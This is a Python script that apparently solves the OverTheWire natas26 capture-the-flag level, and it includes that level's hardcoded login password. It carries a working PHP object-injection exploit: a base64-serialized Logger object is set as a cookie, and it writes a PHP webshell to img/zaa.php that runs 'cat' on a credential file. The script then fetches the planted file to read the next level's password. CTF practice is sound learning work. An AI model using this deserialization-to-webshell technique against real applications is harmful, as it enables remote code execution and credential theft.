#!bin/python3
import requests
import base64

session = requests.Session()

url = "http://natas26.natas.labs.overthewire.org/"
auth_username = "natas26"
auth_password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"

params = {'x1':'0','y1':'0','x2':'200','y2':'200'}

'''
# exploit26.php
<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        $this->initmsg= "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->exitmsg= "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile= "img/zaa.php";
    }
}

$zaa = new Logger();
echo(base64_encode(serialize($zaa)));
?>
'''

serializedObject = 'Tzo2OiJMb2dnZXIiOjU6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMToiaW1nL3phYS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7TjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO047czo3OiJpbml0bXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czo3OiJleGl0bXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=='
r = session.get(url,auth=(auth_username,auth_password),params=params)

session.cookies['drawing'] = serializedObject

r = session.get(url,auth=(auth_username,auth_password),params=params)
print(r.text)
print(r.cookies)

r = session.get(url+"img/zaa.php",auth=(auth_username,auth_password))
print(r.text)